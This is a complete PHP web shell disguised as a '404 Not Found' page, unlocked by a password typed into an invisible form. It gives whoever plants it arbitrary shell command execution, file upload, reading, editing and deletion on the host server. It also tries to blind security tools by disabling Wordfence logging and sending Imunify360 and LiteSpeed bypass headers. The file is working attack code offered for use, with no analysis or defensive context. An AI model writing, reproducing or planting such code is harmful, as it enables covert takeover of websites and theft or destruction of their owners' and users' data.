<?php session_start();@error_reporting(0);@http_response_code(404);$hashedPassword = '8e3bf976813be9e9a1aea30886f1b6de';$rootPath=$_SERVER['DOCUMENT_ROOT'];$dir=isset($_GET['dir']) ? $_GET['dir'] : $rootPath;$dir=rtrim($dir, '/');$uploadMessage='';$fileLabel='';$dirs=[];$files=[];$action=isset($_GET['action']) ? $_GET['action'] : '';if(function_exists('litespeed_request_headers')){$headers=litespeed_request_headers();if(isset($headers['X-LSCACHE'])){header('X-LSCACHE: off');}}if(defined('WORDFENCE_VERSION')){define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);define('WORDFENCE_DISABLE_FILE_MODS', true);}if(function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')){$imunifyHeaders=imunify360_request_headers();if(isset($imunifyHeaders['X-Imunify360-Request'])){header('X-Imunify360-Request: bypass');}}if(isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')){$_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_CF_CONNECTING_IP'];}switch($action){case'upload':if(isset($_FILES['file'])){$namafile=$_FILES['file']['name'];$tempatfile=$_FILES['file']['tmp_name'];$tempat=$dir;$error=$_FILES['file']['error'];$ukuranfile=$_FILES['file']['size'];$uploadMessage=move_uploaded_file($tempatfile, $dir.'/'.$namafile) ? 'File uploaded successfully.' : 'Failed to upload file.';$uploadMessageClass=move_uploaded_file($tempatfile, $dir.'/'.$namafile) ? 'upload-success' : 'upload-failure';}break;case'cmd':if(isset($_POST['command'])){$command=$_POST['command'];try{if(function_exists('shell_exec')){$output=shell_exec($command);}elseif(function_exists('exec')){exec($command, $output);$output=implode("\n", $output);}elseif(function_exists('passthru')){ob_start();passthru($command);$output=ob_get_clean();}elseif(function_exists('system')){ob_start();system($command);$output=ob_get_clean();}elseif(function_exists('proc_open')){$descriptors=array(0 => array('pipe', 'r'),1 => array('pipe', 'w'),2 => array('pipe', 'w'));$process=proc_open($command, $descriptors, $pipes);$output=stream_get_contents($pipes[1]);fclose($pipes[1]);proc_close($process);}else{throw new Exception('Command execution is disabled.');}}catch (Exception $e){$output=$e->getMessage();}}break;case'open':if(isset($_GET['folder'])){$folderPath=$_GET['folder'];$dir=$folderPath;}break;case'deleteFile':$uploadMessage=isset($_GET['file']) ? (unlink($_GET['file']) ? 'File deleted successfully.' : 'Failed to delete file.') : 'File parameter not set.';$uploadMessageClass=isset($_GET['file']) ? (unlink($_GET['file']) ? 'upload-success' : 'upload-failure') : 'upload-failure';break;case'deleteDir':$uploadMessage=isset($_GET['folder']) ? (rmdir($_GET['folder']) ? 'Directory deleted successfully.' : 'Failed to delete directory.') : 'Folder parameter not set.';$uploadMessageClass=isset($_GET['folder']) ? (rmdir($_GET['folder']) ? 'upload-success' : 'upload-failure') : 'upload-failure';break;}try{$items=@scandir($dir);$items !== false && is_array($items) ? array_walk($items, function($item) use ($dir, &$dirs, &$files){if($item !== '.' && $item !== '..'){$path=$dir . '/' . $item;is_dir($path) ? $dirs[]=$item : $files[]=$item;}}) : throw new Exception('Failed to open directory.');}catch(Exception $e){$output=$e->getMessage();}if(isset($action) && $action === 'read' && isset($_GET['file'])){$filePath=$_GET['file'];$fileContent=file_get_contents($filePath);$fileLabel='File: ' . basename($filePath);}if(isset($action) && $action === 'save' && isset($_POST['file']) && isset($_POST['content'])){$filePath=$_POST['file'];$fileContent=$_POST['content'];$saveMessage=file_put_contents($filePath, $fileContent) !== false ? 'File saved successfully.' : 'Failed to save file.';$saveMessageClass=file_put_contents($filePath, $fileContent) !== false ? 'save-success' : 'save-failure';}?><?php $isLoggedIn = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;if($_SERVER["REQUEST_METHOD"] == "POST"){if(isset($_POST['password']) && md5($_POST['password']) === $hashedPassword){$_SESSION['loggedin']=true;$isLoggedIn = true;}else{$loginError="Invalid password!";}}if(!$isLoggedIn){?><title>404 Not Found</title><?php if(isset($loginError)){?><p class="error"><?php echo $loginError;?></p><?php } ?><h1>Not Found</h1><p>The requested URL <?=$_SERVER['PHP_SELF']?> was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr></body></html><form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form><?php exit();} ?><!DOCTYPE html><html><head><title>404 Not Found</title><style>body{font-family: Arial, sans-serif;padding: 1.4rem 7%;display: flex;flex-direction: column;justify-content: center;align-items: center;}h1{margin-bottom: 20px;}.form{margin-top: 10px;}.cmd-output{white-space: pre-wrap;margin-top: 10px;padding: 5px;background-color: #f2f2f2;border: 1px solid #ccc;}.upload-form{margin-top: 20px;margin-bottom: 10px;}.upload-form label{font-weight: bold;}.cmd-form{margin-top: 20px;}.cmd-form label{font-weight: bold;}.button{display: inline-block;padding: 8px 12px;background-color: #4CAF50;color: white;text-decoration: none;border-radius: 4px;margin-right: 5px;}.button:hover{background-color: #45a049;}.file-content-form{margin-top: 20px;}.file-content-form label{font-weight: bold;}.file-content-form textarea{width: 100%;height: 200px;margin-top: 5px;}.save-message{margin-top: 10px;font-weight: bold;}.save-success{color: green;}.save-failure{color: red;}.upload-message{margin-top: 10px;font-weight: bold;}.upload-success{color: green;}.upload-failure{color: red;}.checkbox{margin: 0 1px;}.checkbox-label{font-weight: bold;}   .dir-table{border-spacing: 0;}.dir-table th,.dir-table td{padding: 5px;border: 1px solid #ccc;}</style></head><body><table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><h1>Bypass Code</h1><div class="upload-form"><form class="form" method="POST" action="?action=upload&dir=<?php echo $dir; ?>" enctype="multipart/form-data"><label for="file">Upload File : </label><input type="file" id="file" name="file" required> <button class="button" type="submit">Upload</button></form></div><?php if (!empty($uploadMessage)): ?><div class="upload-message <?php echo $uploadMessageClass; ?>"><?php echo $uploadMessage; ?></div><?php endif; ?><div class="cmd-form"><form class="form" method="POST" action="?action=cmd&dir=<?php echo $dir; ?>"><label for="command">Command : </label><input type="text" id="command" name="command" required> <button class="button" type="submit">Execute</button></form></div><?php if (isset($output)): ?><div class="cmd-output"><?php echo htmlspecialchars($output); ?></div><?php endif; ?><?php if (!empty($saveMessage)): ?><div class="save-message <?php echo $saveMessageClass; ?>"><?php echo $saveMessage; ?></div><?php endif; ?><div class="file-content-form"><?php if (isset($fileContent)): ?><form class="form" method="POST" action="?action=save"><label for="file"><?php echo $fileLabel; ?></label><input type="hidden" name="file" value="<?php echo $filePath; ?>"><textarea name="content" required><?php echo htmlspecialchars($fileContent); ?></textarea><button class="button" type="submit">Save</button></form><?php endif; ?></div></tr></table><div class="dir-table"><table><tr><th>Name</th><th>Type</th><th>Size</th><th>Permission</th><th>Actions</th></tr><?php foreach ($dirs as $dirName): ?><?php $dirPath = $dir . '/' . $dirName; ?><tr><td><a href="?action=open&folder=<?php echo $dirPath; ?>"><?php echo $dirName; ?></a></td><td>Directory</td><td><?php echo filesize($dirPath); ?></td><td><?php echo substr(sprintf('%o', fileperms($dirPath)), -4); ?></td><td><a class="button" href="?action=open&folder=<?php echo $dirPath; ?>">Open</a><a class="button" href="?action=deleteDir&folder=<?php echo $dirPath; ?>" onclick="return confirm('Are you sure you want to delete this directory?')">Delete</a></td></tr><?php endforeach; ?><?php foreach ($files as $fileName): ?><?php $filePath = $dir . '/' . $fileName; ?><tr><td><?php echo $fileName; ?></td><td>File</td><td><?php echo filesize($filePath); ?></td><td><?php echo substr(sprintf('%o', fileperms($filePath)), -4); ?></td><td><a class="button" href="?action=read&file=<?php echo $filePath; ?>">Read</a><a class="button" href="?action=deleteFile&file=<?php echo $filePath; ?>" onclick="return confirm('Are you sure you want to delete this file?')">Delete</a></td></tr><?php endforeach; ?></table></div</body></html>